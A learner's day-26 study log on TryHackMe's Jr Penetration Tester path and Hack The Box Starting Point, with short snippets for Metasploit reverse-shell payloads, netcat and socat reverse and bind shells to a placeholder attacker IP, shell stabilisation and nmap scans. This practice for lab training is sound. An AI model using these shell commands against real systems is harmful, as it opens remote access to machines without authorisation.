🚀 Day 26 — Jr Penetration Tester Path (TryHackMe) & Hack The Box Starting Point  

Today I started the **Jr Penetration Tester Path on TryHackMe** while also progressing through **Hack The Box Starting Point (Tier 0)**.  
Along the way, I explored and practiced with **Metasploit, Netcat, Socat, reverse/bind shells, and web shells** — core skills for penetration testing.  

This write-up documents my progress and key learnings so it can serve as a handy reference for myself and others.  

---

## 📂 Path & Platform Overview  

### **TryHackMe – Jr Penetration Tester**  
Covers the core skills needed to perform web app and infrastructure security assessments.  
Modules I touched today:  
- *Privilege Escalation – “What the Shell?”* (reverse & bind shells)  
- *Introduction to Web Hacking – “Walking an Application”* (manual review using browser dev tools)  

### **Hack The Box – Starting Point (Tier 0)**  
Focus on learning the basics of penetration testing.  
Progress: **39% complete** (pwned: Meow ✅, Fawn ✅, Dancing ✅ | Working on: Redeemer).  
Key learning outcomes:  
- Connect to FTP, SMB, Telnet, Rsync, and RDP.  
- Use **Nmap** to discover open ports.  
- Connect to and explore a **MongoDB server**.  

---

## 🛠️ Tools & Concepts Explored  

### 🔗 Metasploit  
- Payloads: staged vs stageless.  
- Exploit modules and handler setup.  
- Automating exploitation while maintaining awareness of manual alternatives.  

**Basic Commands:**  
```bash
msfconsole              # Start Metasploit
search exploit_name     # Search for exploits
use exploit/path        # Select exploit
set payload linux/x86/shell_reverse_tcp
set RHOST <target>
set LHOST <your_ip>
exploit
```

---

### 🐚 Netcat & Socat  
- Netcat for quick reverse/bind shells.  
- Socat for more stable relays, port forwarding, and encrypted channels.  

**Netcat Commands:**  
```bash
# Listener
nc -lvnp 4444

# Reverse shell
nc <attacker_ip> 4444 -e /bin/bash
```

**Socat Commands:**  
```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Reverse shell
socat TCP:<attacker_ip>:4444 EXEC:/bin/bash
```

---

### 🌐 Shells & Web Shells  
- Reverse & bind shell theory.  
- Stabilizing shells (e.g., upgrading TTY).  
- Uploading and invoking web shells.  

**Shell Upgrade Tricks:**  
```bash
# Python upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Backgrounding and bringing shell to foreground
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### 🕵️ Web Application Testing  
- Walking through an application manually with browser dev tools.  
- Observing requests, responses, and potential vulnerabilities without automation.  

---

### 🔍 Enumeration with Nmap  
```bash
# Quick scan
nmap -sV <target_ip>

# Aggressive scan
nmap -A <target_ip>

# Specific ports
nmap -p 21,22,80,443 <target_ip>
```

---

## ✨ Key Learnings  
1. **Reverse vs Bind Shells**: Clear understanding of their differences and use-cases.  
2. **Netcat & Socat**: Must-know tools for quick access and flexible shell handling.  
3. **Shell Hygiene**: Stabilize and upgrade shells early to avoid disruptions.  
4. **Enumeration First**: Systematic port scanning + service checks = smoother exploitation.  
5. **Manual Recon Matters**: Browser dev tools can uncover issues before automated scanners.  

---

## 📌 Reflection  
Day 26 reinforced the importance of mastering **foundational skills** in penetration testing: enumeration, shell handling, and tool versatility.  
By combining structured learning on **TryHackMe** with hands-on practice on **Hack The Box**, I’m building both the knowledge and the muscle memory to approach real-world pentesting challenges.  

✔️ Day 26 complete — more boxes, more shells, and deeper exploitation ahead! 🚀  

---

## 🔗 Resources  
- [TryHackMe Jr Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester)  
- [Hack The Box – Starting Point](https://app.hackthebox.com/starting-point)  
- [Metasploit Framework](https://www.metasploit.com/)  
- [Netcat Basics](http://nc110.sourceforge.net/)  
- [Socat Guide](http://www.dest-unreach.org/socat/)  

---

📝 **Author**  
Part of my #100DaysOfCyberSecurity Journey  
GitHub Repo: [learning-in-public](https://github.com/Prxdhxman/learning-in-public)  
 
<img width="1920" height="1080" alt="Screenshot at 2025-09-04 23-18-28" src="https://github.com/user-attachments/assets/f1bd6f00-d6d2-496c-bf3f-fd945016f6fe" />
<img width="1920" height="1080" alt="Screenshot at 2025-09-04 22-58-45" src="https://github.com/user-attachments/assets/dbbf2e00-9c12-4142-8465-2addafb9b151" />
